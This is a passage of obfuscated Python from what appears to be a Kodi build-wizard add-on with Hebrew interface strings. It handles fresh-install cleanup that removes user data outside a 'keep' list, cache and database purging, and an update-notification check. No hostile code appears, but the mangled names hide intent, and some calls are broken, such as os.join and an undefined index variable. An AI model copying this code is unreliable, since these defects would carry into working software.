				elif O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'skin.Premium.mod'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4912
				elif O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'skin.anonymous.nox'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4913
				elif O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'skin.phenomenal'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4914
				elif O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'plugin.video.metalliq'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4915
				elif O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'skin.titan'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4917
				elif O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'pvr.iptvsimple'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4918
				elif O00OOO0OOO000O00O =='sources.xml'and O0O00O000000000O0 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4920
				elif O00OOO0OOO000O00O =='quicknav.DATA.xml'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4923
				elif O00OOO0OOO000O00O =='x1101.DATA.xml'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4924
				elif O00OOO0OOO000O00O =='b-srtym-b.DATA.xml'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4925
				elif O00OOO0OOO000O00O =='x1102.DATA.xml'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4926
				elif O00OOO0OOO000O00O =='b-sdrvt-b.DATA.xml'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4927
				elif O00OOO0OOO000O00O =='x1112.DATA.xml'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4928
				elif O00OOO0OOO000O00O =='b-tlvvyzyh-b.DATA.xml'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4929
				elif O00OOO0OOO000O00O =='x1111.DATA.xml'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4930
				elif O00OOO0OOO000O00O =='b-tvknyshrly-b.DATA.xml'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4931
				elif O00OOO0OOO000O00O =='x1110.DATA.xml'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4932
				elif O00OOO0OOO000O00O =='b-yldym-b.DATA.xml'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4933
				elif O00OOO0OOO000O00O =='x1114.DATA.xml'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4934
				elif O00OOO0OOO000O00O =='b-mvzyqh-b.DATA.xml'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4935
				elif O00OOO0OOO000O00O =='mainmenu.DATA.xml'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4936
				elif O00OOO0OOO000O00O =='skin.Premium.mod.properties'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4937
				elif O00OOO0OOO000O00O =='x1122.DATA.xml'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4939
				elif O00OOO0OOO000O00O =='b-spvrt-b.DATA.xml'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4940
				elif O00OOO0OOO000O00O =='favourites.xml'and O0O00O000000000O0 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4945
				elif O00OOO0OOO000O00O =='guisettings.xml'and O0O00O000000000O0 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4947
				elif O00OOO0OOO000O00O =='profiles.xml'and O0O00O000000000O0 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4948
				elif O00OOO0OOO000O00O =='advancedsettings.xml'and O0O00O000000000O0 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4949
				elif O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4950
				elif O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'program.apollo'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4951
				elif O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4952
				elif O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'plugin.video.elementum'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4955
				elif O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4957
				elif O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'weather.yahoo'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4958
				elif O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'plugin.video.quasar'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4959
				elif O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'program.apollo'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4960
				elif O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4961
				elif O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4962
				elif O00OOO0OOO000O00O in LOGFILES :wiz .log ("Keep Log File: %s"%O00OOO0OOO000O00O ,xbmc .LOGNOTICE )#line:4963
				elif O00OOO0OOO000O00O .endswith ('.db'):#line:4964
					try :#line:4965
						if O00OOO0OOO000O00O ==OO0O0OO0O0O000000 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O00OOO0OOO000O00O ,KODIV ),xbmc .LOGNOTICE )#line:4966
						else :os .remove (os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ))#line:4967
					except Exception as O000O0OO0OO000000 :#line:4968
						if not O00OOO0OOO000O00O .startswith ('Textures13'):#line:4969
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4970
							wiz .log ("-> %s"%(str (O000O0OO0OO000000 )),xbmc .LOGNOTICE )#line:4971
							wiz .purgeDb (os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ))#line:4972
				else :#line:4973
					DP .update (int (wiz .percentage (O0000O00O0O000OO0 ,O00O00O000OO00000 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOO0OOO000O00O ),'')#line:4974
					try :os .remove (os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ))#line:4975
					except Exception as O000O0OO0OO000000 :#line:4976
						wiz .log ("Error removing %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4977
						wiz .log ("-> / %s"%(str (O000O0OO0OO000000 )),xbmc .LOGNOTICE )#line:4978
			if DP .iscanceled ():#line:4979
				DP .close ()#line:4980
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4981
				return False #line:4982
		for O0OOOO0000OOO0OO0 ,O0O0OOO0O00000O00 ,OO00000OO0O0000O0 in os .walk (OO0000OO00O000O00 ,topdown =True ):#line:4983
			O0O0OOO0O00000O00 [:]=[O0OO00OOO0O0O0OO0 for O0OO00OOO0O0O0OO0 in O0O0OOO0O00000O00 if O0OO00OOO0O0O0OO0 not in EXCLUDES ]#line:4984
			for O00OOO0OOO000O00O in O0O0OOO0O00000O00 :#line:4985
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O00OOO0OOO000O00O ),'')#line:4986
			  if O00OOO0OOO000O00O not in ["Database","userdata","temp","addons","addon_data"]:#line:4987
			   if not (O00OOO0OOO000O00O =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4988
			    if not (O00OOO0OOO000O00O =='skin.titan'and KEEPSKIN3 =='true'):#line:4990
			      if not (O00OOO0OOO000O00O =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4991
			       if not (O00OOO0OOO000O00O =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4992
			        if not (O00OOO0OOO000O00O =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4993
			         if not (O00OOO0OOO000O00O =='program.apollo'and KEEPINFO =='true'):#line:4994
			          if not (O00OOO0OOO000O00O =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4995
			           if not (O00OOO0OOO000O00O =='weather.yahoo'and KEEPWEATHER =='true'):#line:4996
			            if not (O00OOO0OOO000O00O =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4997
			             if not (O00OOO0OOO000O00O =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4998
			              if not (O00OOO0OOO000O00O =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4999
			               if not (O00OOO0OOO000O00O =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5000
			                if not (O00OOO0OOO000O00O =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5001
			                 if not (O00OOO0OOO000O00O =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5002
			                  if not (O00OOO0OOO000O00O =='plugin.video.neptune'and KEEPINFO =='true'):#line:5003
			                   if not (O00OOO0OOO000O00O =='plugin.video.youtube'and KEEPINFO =='true'):#line:5004
			                    if not (O00OOO0OOO000O00O =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5005
			                     if not (O00OOO0OOO000O00O =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5006
			                      if not (O00OOO0OOO000O00O =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5007
			                           if not (O00OOO0OOO000O00O =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5012
			                            if not (O00OOO0OOO000O00O =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5013
			                             if not (O00OOO0OOO000O00O =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5014
			                              if not (O00OOO0OOO000O00O =='plugin.video.quasar'and KEEPINFO =='true'):#line:5015
			                               if not (O00OOO0OOO000O00O =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5016
			                                  shutil .rmtree (os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),ignore_errors =True ,onerror =None )#line:5018
			if DP .iscanceled ():#line:5019
				DP .close ()#line:5020
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5021
				return False #line:5022
		DP .close ()#line:5023
		wiz .clearS ('build')#line:5024
		if over ==True :#line:5025
			return True #line:5026
		elif install =='restore':#line:5027
			return True #line:5028
		elif install :#line:5029
			buildWizard (install ,'normal',over =True )#line:5030
		else :#line:5031
			if INSTALLMETHOD ==1 :OOOO0O00OO00OO000 =1 #line:5032
			elif INSTALLMETHOD ==2 :OOOO0O00OO00OO000 =0 #line:5033
			else :OOOO0O00OO00OO000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5034
			if OOOO0O00OO00OO000 ==1 :wiz .reloadFix ('fresh')#line:5035
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5036
	else :#line:5037
		if not install =='restore':#line:5038
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5039
			wiz .refresh ()#line:5040
def clearCache ():#line:5045
		wiz .clearCache ()#line:5046
def fixwizard ():#line:5050
		wiz .fixwizard ()#line:5051
def totalClean ():#line:5053
		wiz .clearCache ()#line:5055
		wiz .clearPackages ('total')#line:5056
		clearThumb ('total')#line:5057
		cleanfornewbuild ()#line:5058
def cleanfornewbuild ():#line:5059
		try :#line:5060
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5061
		except :#line:5062
			pass #line:5063
		try :#line:5064
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5065
		except :#line:5066
			pass #line:5067
		try :#line:5068
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5069
		except :#line:5070
			pass #line:5071
def clearThumb (type =None ):#line:5072
	OOOO0OOOOO0O0OOOO =wiz .latestDB ('Textures')#line:5073
	if not type ==None :O0OO0OO0000O0000O =1 #line:5074
	else :O0OO0OO0000O0000O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OOOO0OOOOO0O0OOOO ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5075
	if O0OO0OO0000O0000O ==1 :#line:5076
		try :wiz .removeFile (os .join (DATABASE ,OOOO0OOOOO0O0OOOO ))#line:5077
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OOOO0OOOOO0O0OOOO )#line:5078
		wiz .removeFolder (THUMBS )#line:5079
	else :wiz .log ('Clear thumbnames cancelled')#line:5081
	wiz .redoThumbs ()#line:5082
def purgeDb ():#line:5084
	OOOOO0OOOOOOOOOOO =[];O0OO0O0OO0OO0OOOO =[]#line:5085
	for O000O00O00000OO00 ,OOO0O000O0OO0OOOO ,OO000OOOOO0OOO0O0 in os .walk (HOME ):#line:5086
		for O0O0OO0000OOO0O0O in fnmatch .filter (OO000OOOOO0OOO0O0 ,'*.db'):#line:5087
			if O0O0OO0000OOO0O0O !='Thumbs.db':#line:5088
				O0O00OOO000O00000 =os .path .join (O000O00O00000OO00 ,O0O0OO0000OOO0O0O )#line:5089
				OOOOO0OOOOOOOOOOO .append (O0O00OOO000O00000 )#line:5090
				O00000O0O000OO0OO =O0O00OOO000O00000 .replace ('\\','/').split ('/')#line:5091
				O0OO0O0OO0OO0OOOO .append ('(%s) %s'%(O00000O0O000OO0OO [len (O00000O0O000OO0OO )-2 ],O00000O0O000OO0OO [len (O00000O0O000OO0OO )-1 ]))#line:5092
	if KODIV >=16 :#line:5093
		OOO0OO000OO00O000 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0OO0O0OO0OO0OOOO )#line:5094
		if OOO0OO000OO00O000 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5095
		elif len (OOO0OO000OO00O000 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5096
		else :#line:5097
			for O0O0000OOOO0OO00O in OOO0OO000OO00O000 :wiz .purgeDb (OOOOO0OOOOOOOOOOO [O0O0000OOOO0OO00O ])#line:5098
	else :#line:5099
		OOO0OO000OO00O000 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0OO0O0OO0OO0OOOO )#line:5100
		if OOO0OO000OO00O000 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5101
		else :wiz .purgeDb (OOOOO0OOOOOOOOOOO [O0O0000OOOO0OO00O ])#line:5102
def fastupdatefirstbuild (OO000000OO0O0O000 ):#line:5108
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5110
	if ENABLE =='Yes':#line:5111
		if not NOTIFY =='true':#line:5112
			O0O0O0O000O00OOOO =wiz .workingURL (NOTIFICATION )#line:5113
			if O0O0O0O000O00OOOO ==True :#line:5114
				OO00OOO0000O0O000 ,O0OO0OOO0OOOO00O0 =wiz .splitNotify (NOTIFICATION )#line:5115
				if not OO00OOO0000O0O000 ==False :#line:5117
					try :#line:5118
						OO00OOO0000O0O000 =int (OO00OOO0000O0O000 );OO000000OO0O0O000 =int (OO000000OO0O0O000 )#line:5119
						checkidupdate ()#line:5120
						wiz .setS ("notedismiss","true")#line:5121
						if OO00OOO0000O0O000 ==OO000000OO0O0O000 :#line:5122
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OO00OOO0000O0O000 ),xbmc .LOGNOTICE )#line:5123
						elif OO00OOO0000O0O000 >OO000000OO0O0O000 :#line:5125
							wiz .log ("[Notifications] id: %s"%str (OO00OOO0000O0O000 ),xbmc .LOGNOTICE )#line:5126
							wiz .setS ('noteid',str (OO00OOO0000O0O000 ))#line:5127
							wiz .setS ("notedismiss","true")#line:5128
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5131
					except Exception as OOO00000OOO0OO000 :#line:5132
						wiz .log ("Error on Notifications Window: %s"%str (OOO00000OOO0OO000 ),xbmc .LOGERROR )#line:5133
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5135
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O0O0O0O000O00OOOO ),xbmc .LOGNOTICE )#line:5136
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5137
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5138
def checkidupdate ():#line:5144
				wiz .setS ("notedismiss","true")#line:5146
				O00O0OO0OOO0OOOO0 =wiz .workingURL (NOTIFICATION )#line:5147
				O0000OO0O0OO000O0 =" Kodi Premium"#line:5149
				O0OOO0OOO0O00OO00 =wiz .checkBuild (O0000OO0O0OO000O0 ,'gui')#line:5150
